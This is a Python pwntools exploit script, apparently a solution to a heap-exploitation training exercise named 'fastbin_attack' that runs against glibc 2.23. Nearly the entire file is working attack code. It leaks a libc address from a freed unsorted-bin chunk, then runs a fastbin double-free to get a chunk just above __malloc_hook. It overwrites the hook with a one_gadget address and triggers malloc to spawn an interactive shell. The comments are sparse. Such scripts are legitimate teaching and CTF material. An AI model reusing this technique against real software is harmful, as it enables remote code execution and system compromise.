#!/usr/bin/python3
from pwn import *
import re
PROGRAM = "./fastbin_attack"
HOST    = "training.jinblack.it"
PORT    = 10101
LIBC    = "./libc-2.23.so"
GDB_c   =   """
            p (void*)&__malloc_hook
            brva 0x00000db5
            command 1
                x/40gx $1    
            end
            """

#NX     Y
#PIE    Y
#ASLR   Y


if args.GDB:
    r = process(PROGRAM)
    gdb.attach(r, GDB_c)
    input("[!] Waiting for gdb...")
elif args.REMOTE:
    r = remote(HOST, PORT)
else:
    r = process(PROGRAM)

def trigger_malloc_hook(size):
    r.recvuntil("> ")
    r.sendline(b"1")
    r.recvuntil("Size: ")
    r.sendline(str(size).encode())

def alloc(size):
    r.recvuntil("> ")
    r.sendline(b"1")
    r.recvuntil("Size: ")
    r.sendline(str(size).encode())
    line = r.recvuntil("\n")
    index = re.search(b"Allocated at index ([0-9]+)", line).group(1)
    return index

def write_entry(index, msg):
    r.recvuntil("> ")
    r.sendline(b"2")
    r.recvuntil("Index: ")
    r.sendline(index)
    r.recvuntil("Content: ")
    r.sendline(msg)

def read_entry(index):
    r.recvuntil("> ")
    r.sendline(b"3")
    r.recvuntil("Index: ")
    r.sendline(index)
    line = r.recvline()
    print(line)
    return line
    
def free_entry(index):
    r.recvuntil("> ")
    r.sendline(b"4")
    r.recvuntil("Index: ")
    r.sendline(index)
    sleep(0.01)
    print(r.recvline())

libc = ELF(LIBC)
# print(libc.symbols)
print(hex(libc.symbols['__malloc_hook']))

chunk_A = alloc(0x60)
chunk_B = alloc(0x60)
write_entry(chunk_A, b"\x01"*0x60)
write_entry(chunk_B, b"\x02"*0x60)
# input("After commenting entries")
unsorted_chunk = alloc(0xb0)

sep_chunk = alloc(0x20)                     # avoid that the chunk3 is consolidated with the top chunk

free_entry(unsorted_chunk)
libc_leak = read_entry(unsorted_chunk)[:-1]+b"\x00\x00"

libc_base = u64(libc_leak) - 0x3c4b78
libc.address = libc_base
# malloc_hook = libc_base + (libc.symbols['__malloc_hook'] & 0xfff)
malloc_hook = (libc.symbols['__malloc_hook'])

log.info("Libc address leak: 0x%x", u64(libc_leak))
log.info("Libc base: 0x%x",         libc.address)
log.info("Malloc hook: 0x%x",       malloc_hook)

# input("before 1 free")
free_entry(chunk_A)   #head->chunk_A
#input("Check")
free_entry(chunk_B)   #head->chunk_B->chunk_A
# input("Before double free...")
free_entry(chunk_A)   #head->chunk_A->chunk_B->chunk_A


chunk_A_2 = alloc(0x60) #head->chunk_B->chunk_A
chunk_B_2 = alloc(0x60) #head->chunk_A
# input("check the head, it should point to chunk_A...")
write_entry(chunk_A_2, p64(malloc_hook-0x23)) # making the freed chunk_A appear like the next element in the bin is a chunk located where (almost) the malloc hook is
#head->chunk_A->above_malloc_hook
# input("Check if A is written to correctly...")
log.info("writing at: 0x%x",       malloc_hook-0x23-0x4)

# free_entry(chunk_B_2)
# free_entry(chunk_A_2)

alloc(0x60) # head->above_malloc_hook
# input("Before the malicious alloc")
malicious_chunk = alloc(0x60) 
# input("check the head, it should point above the malloc_hook...")
# write_entry(malicious_chunk, b"A"*19+p64(libc.symbols['system']))
write_entry(malicious_chunk, b"A"*19+p64(libc.address+0xf1247)) # one_gadget

# input("Hook overwritten")
# binsh = next(libc.search(b"/bin/sh\x00"))
# log.info("binsh at: 0x%x",       binsh)

# alloc(p64(binsh))

trigger_malloc_hook(40)

# r.sendline(b"ls")
#malloc_hook - 0x13 c'è 7f --> -0x13 -0x10

r.interactive()
#trigger a malloc